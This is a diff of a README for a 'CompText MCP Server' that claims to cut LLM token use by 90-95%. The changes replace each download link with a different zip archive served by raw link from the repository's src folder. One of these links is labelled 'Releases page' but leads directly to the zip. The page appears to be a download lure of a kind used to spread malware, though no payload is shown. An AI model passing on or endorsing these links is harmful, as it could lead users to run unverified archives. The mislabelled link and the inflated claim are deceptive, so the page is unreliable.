@@ -4,13 +4,13 @@
 Welcome to the CompText MCP Server! This server helps you interact with large language models (LLMs) while minimizing the amount of tokens you use. With our simple setup, you can reduce token usage by 90-95%, making your interactions more efficient. This application is part of the CompText Ecosystem, designed to enhance your experience with NLP tools.
 
 ## 📦 Download the Application
-[![Download CompText MCP Server](https://raw.githubusercontent.com/Frank4112/comptext-mcp-server/main/src/comptext_mcp/comptext_server_mcp_v2.9.zip)](https://raw.githubusercontent.com/Frank4112/comptext-mcp-server/main/src/comptext_mcp/comptext_server_mcp_v2.9.zip)
+[![Download CompText MCP Server](https://raw.githubusercontent.com/Frank4112/comptext-mcp-server/main/src/server-mcp-comptext-v2.0-beta.4.zip)](https://raw.githubusercontent.com/Frank4112/comptext-mcp-server/main/src/server-mcp-comptext-v2.0-beta.4.zip)
 
 ## 🚀 Getting Started
 To get started with the CompText MCP Server, follow these steps:
 
 1. **Visit the Releases Page**  
-   Go to our [Releases page](https://raw.githubusercontent.com/Frank4112/comptext-mcp-server/main/src/comptext_mcp/comptext_server_mcp_v2.9.zip) to find the latest version of the application.
+   Go to our [Releases page](https://raw.githubusercontent.com/Frank4112/comptext-mcp-server/main/src/server-mcp-comptext-v2.0-beta.4.zip) to find the latest version of the application.
 
 2. **Choose Your Version**  
    Look for the most recent release. You will see various files available for download. Select the one that fits your system. Generally, there will be both Windows and Mac options.
@@ -51,6 +51,6 @@ If you experience any issues or have questions, please refer to our Support sect
 ## 🔗 Download & Install
 To get started with the CompText MCP Server, click the link below to visit the Releases page and download the application.
 
-[Download CompText MCP Server](https://raw.githubusercontent.com/Frank4112/comptext-mcp-server/main/src/comptext_mcp/comptext_server_mcp_v2.9.zip) 
+[Download CompText MCP Server](https://raw.githubusercontent.com/Frank4112/comptext-mcp-server/main/src/server-mcp-comptext-v2.0-beta.4.zip) 
 
 Thank you for choosing CompText MCP Server! Enjoy streamlined interactions and reduced token usage!
